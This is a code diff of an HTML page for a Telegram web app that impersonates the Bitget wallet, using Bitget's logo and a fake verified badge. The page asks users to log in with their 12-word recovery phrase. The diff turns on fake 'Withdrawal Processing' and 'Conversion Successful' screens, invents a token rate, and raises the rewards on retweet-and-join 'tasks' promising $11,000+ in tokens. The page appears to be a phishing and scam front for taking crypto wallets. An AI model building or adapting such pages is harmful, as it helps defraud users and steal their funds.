@@ -2,23 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>Phantom Wallet Balance</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <title>Bitget Wallet</title> 
   <link rel="stylesheet" href="styles.css">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=arrow_back" />
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>   
+  <script> 
+ window.addEventListener("DOMContentLoaded", function () {
+    const tg = window.Telegram.WebApp;
+
+    tg.ready();
+
+    if (tg.isVersionAtLeast("8.0")) {
+      tg.requestFullscreen();
+    } else {
+      tg.expand();
+    }
+
+    tg.setHeaderColor("#181A20");
+  });
+</script>
   
  </head>  
+  
+  
 <body>
+  <!--    { name: 'SVERV', abbr: 'SVERV', logoUrl: 'https://shorturl.at/RSMx8', id: 'usd-coin', balance: 0, address: '0xb0B61e915d54BC5bf570ac5340Cd308928CE1D35', network: 'ERC20' },-->
+  <div class="top-bar-head">Bitget Swap&nbsp<img src="https://cdn-icons-png.flaticon.com/128/7641/7641727.png" alt="BTC" class="top-bar-verif"></div>
+    
+  <div class="all-offset">
+  
+  <div class="card" hidden>  
+  <h1>Wallet Balance</h1>
+  <div class="balance" id="connect-eth">Loading...</div> 
+  <div class="usd" id="usd">Loading...</div> 
+  <div class="status" id="status">Connecting...</div>
+</div>
   
   
-  
-  
-  
+      
+
   
   
     <div id="login-container-one" class="login-container-one"> 
-     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/2560px-Logo_Biget.svg.png" alt="BTC" class="binance-icon">
-     <div class=""></div>
+      <div class="">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon">
+        <!--<img src="https://cdn-icons-png.flaticon.com/128/7641/7641727.png" alt="BTC" class="binance-icon-verified"> -->
+      </div>
+    
     <!--<h1>Login with Your 24-Phrase Key 1</h1>--> 
     <!--<img src="https://public.bnbstatic.com/image/cms/content/body/202310/611e56e75c82c60b33fa51589122e396.jpg" alt="BTC" class="marketplace">-->
   
@@ -40,7 +72,7 @@
    <div class="text-slider-container">
     <div class="text-slider-track">
       <!-- Text lines -->
-      <div>Build your portfolio from over 600+ listed tokens.</div>
+      <div>Build your portfolio from over 600+ listed token.</div>
       <div>Discover trending assets, seamless token swaps</div>
       <div>Insights to make smarter financial decisions.</div>
       <!-- Duplicate for seamless loop -->
@@ -62,10 +94,10 @@
   
 
   
-  
+   
    <div id="login-container" class="login-container hidden">
        
-     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/2560px-Logo_Biget.svg.png" alt="BTC" class="binance-icon-phrase">
+     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon-phrase">
      <div class=""></div>
     <h1>Login with Your 12-Phrase Key</h1> <span class="material-symbols-outlined" id="out-button"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
     <form id="login-form">
@@ -82,7 +114,7 @@
    
   <div id="phrase-container" class="phrase-container hidden">
        
-     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/2560px-Logo_Biget.svg.png" alt="BTC" class="binance-icon-phrase">
+     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon-phrase">
      <div class=""></div>
     <h1>Create New Wallet</h1> <span class="material-symbols-outlined" id="out-button-two"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button> 
     
@@ -116,7 +148,7 @@
   <div class="binance-logo-back"></div> 
   <div class="wallet">  
     
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/2560px-Logo_Biget.svg.png" alt="BTC" class="binance-icon">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon">
     
     
     <div id="deposit-top-display" class="deposit-top-display hidden">Deposit</div>
@@ -141,6 +173,7 @@
     <div class="cryptos">
       <div class="h-font">Assets</div>
       <ul id="crypto-list"></ul>
+      <div class="int-con-error">Poor internet connection. Please wait...</div>     
     </div>
   </div> 
 
@@ -491,15 +524,15 @@ setInterval(fetchBNBPrice, 120000);
         
             <button class="p-close-button-z" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
           
-         <!--<div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+         <!----><div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
           <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="withdraw-icon">  
           <div class="withdrawal-processing">Withdrawal Processing</div> 
-          <div class="withdrawal-p-amt">11,000 USDC</div>  
-          <span class="withdrawal-estim">Estimated completion time: 2026-02-15 12:50:31.</span> 
+          <div class="withdrawal-p-amt">1,500 USDC</div>  
+          <span class="withdrawal-estim">Estimated completion time: 2026-04-08 12:08:31.</span> 
           <span class="withdrawal-estim">You will receive a notification once withdrawal
           is completed.</span> 
           <span class="withdrawal-estim">View history for latest updates</span> 
-          <div class="with-done" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';">Done</div>-->
+          <div class="with-done" onclick="document.querySelector('#withdraw-confirm-modal').style.display='none';document.querySelector('#send-modal').style.display='block';">Done</div>
     
         </div>
         </div>
@@ -637,16 +670,16 @@ setInterval(fetchBNBPrice, 120000);
                
               <div class="connect-aix" id="connect-aix">Connect Wallet</div> 
               
-              
+               
 <div class="task-div hidden" id="task-div">
-  <div class="task-follow">Tasks</div>
+  <div class="task-follow">Tasks</div> 
   
   <div class="task-slide">
- <a href="https://x.com/Novaex_AI/status/2022892909130125352?s=46" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3020" data-max="5030"><img src="https://cdn-icons-png.flaticon.com/128/733/733579.png" alt="USDT" class="task-img"><div class="task-text">Retweet</div></a>
+ <a href="https://x.com/Novaex_AI/status/2022892909130125352?s=46" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3020" data-max="18350"><img src="https://cdn-icons-png.flaticon.com/128/733/733579.png" alt="USDT" class="task-img"><div class="task-text">Retweet</div></a>
               
- <a href="https://youtu.be/o4XaK-_OdM0?si=6XTXhyqyQw3cJj2G" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3030" data-max="8060"><img src="https://cdn-icons-png.flaticon.com/128/1384/1384060.png" alt="USDT" class="task-img"><div class="task-text">Watch</div></a>
+ <a href="https://youtu.be/o4XaK-_OdM0?si=6XTXhyqyQw3cJj2G" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3030" data-max="21380"><img src="https://cdn-icons-png.flaticon.com/128/1384/1384060.png" alt="USDT" class="task-img"><div class="task-text">Watch</div></a>
               
-<a href="https://t.me/NovaEx_Ai" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3100" data-max="11160"><img src="https://cdn-icons-png.flaticon.com/128/2111/2111646.png" alt="USDT" class="task-img"><div class="task-text">Join</div></a>
+<a href="https://t.me/NovaEx_Ai" target="_blank" rel="noopener noreferrer" class="task-sec" data-reward="3100" data-max="24480"><img src="https://cdn-icons-png.flaticon.com/128/2111/2111646.png" alt="USDT" class="task-img"><div class="task-text">Join</div></a>
   </div>
   
   <div class="task-guide">Complete the tasks to claim $11,000+ NOVA</div> 
@@ -729,7 +762,7 @@ setInterval(fetchBNBPrice, 120000);
     <div class="accept-box-amount-to"><div class="accept-box-conv">0.00</div>&nbspUSDC</div> 
     </div>
       
-    <div class="accept-box-usd">$<div class="accept-box-conv-usd">0.00</div></div>  
+    <div class="accept-box-usd">$<div class="accept-box-conv-usd">0.00</div></div> 
       
     <div class="accept-box-details">
       <div class="accept-box-details-a">   
@@ -774,7 +807,7 @@ setInterval(fetchBNBPrice, 120000);
       }
       
       if (!isNaN(inputValue)) {
-        convertedUsdDiv.textContent = (inputValue * 1).toFixed(2);
+        convertedUsdDiv.textContent = (inputValue * 1.02).toFixed(2);
       } else {
         convertedUsdDiv.textContent = '';
       }
@@ -790,7 +823,7 @@ setInterval(fetchBNBPrice, 120000);
         
             <button class="p-close-button-z" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></button>
           
-         <!-- <div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
+         <!-- --><div class="withdraw-warning">We believe that smart savings starts with trust. Bitget is built with industry-grade security, transparent processes, and dedicated support. So you can transact with peace of mind.</div>
           <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png" alt="BTC" class="withdraw-icon">  
           <div class="convert-processing">Conversion Successful</div> 
           
@@ -804,15 +837,15 @@ setInterval(fetchBNBPrice, 120000);
       </div>  
          
       <div class="accept-box-details-b">   
-      <div class="accept-box-right-conv"><div class="conv-box-win"></div>&nbspNOVA</div>  
+      <div class="accept-box-right-conv"><div class="conv-box-win"></div>&nbspSVERV</div>  
       <div class="accept-box-right-conv"><div class="conv-box-conv"></div>&nbspUSDC</div> 
-      <div class="accept-box-right-conv">1 USDC = 1 NOVA </div> 
-      <div class="accept-box-right-conv">0.48 ETH</div> 
+      <div class="accept-box-right-conv">0.32 USDC = 1 SVERV </div> 
+      <div class="accept-box-right-conv">0.070 ETH</div> 
       </div>  
         </div>  
             
           <span class="convert-history">View conversion history</span> 
-          <div class="with-done" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';">Confirm</div>-->
+          <div class="with-done" onclick="document.querySelector('#convert-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';">Confirm</div>
     
         </div>
         </div>
@@ -832,7 +865,7 @@ setInterval(fetchBNBPrice, 120000);
 
       // Update convertedDiv with calculated value
       if (!isNaN(inputValueConv)) {
-        convertedDivConv.textContent = (inputValueConv * 1).toFixed(2);
+        convertedDivConv.textContent = (inputValueConv * 0.3).toFixed(2);
       } else {
         convertedDivConv.textContent = '';
       }
@@ -879,7 +912,7 @@ setInterval(fetchBNBPrice, 120000);
   <div id="p2p-modal" class="modal">
     <div class="modal-content"> 
       <span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/2560px-Logo_Biget.svg.png" alt="BTC" class="binance-icon-two">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Logo_Biget.svg/960px-Logo_Biget.svg.png" alt="BTC" class="binance-icon-two">
       
       <div class="become-merchant-area">   
         <div><img src="https://cdn-icons-png.flaticon.com/128/3602/3602342.png" alt="notifications" class="become-image"></div>
@@ -1528,7 +1561,7 @@ setInterval(fetchPiPrice, 120000);
         <div class="min-max-description">  
             <div>Limit: 2,500.00 USDT - 10,000,000.00 USDT</div>
             <button id="confirm-ad-button" class="confirm-button">Confirm</button>
-        </div>
+        </div> 
     </div>
   </div>
          
@@ -1536,12 +1569,10 @@ setInterval(fetchPiPrice, 120000);
    
      
  </div>
+   
+ </div>
+    
     <script src="script.js"></script>
-  
-  
+   
 </body>
 </html>
-
-
-
-
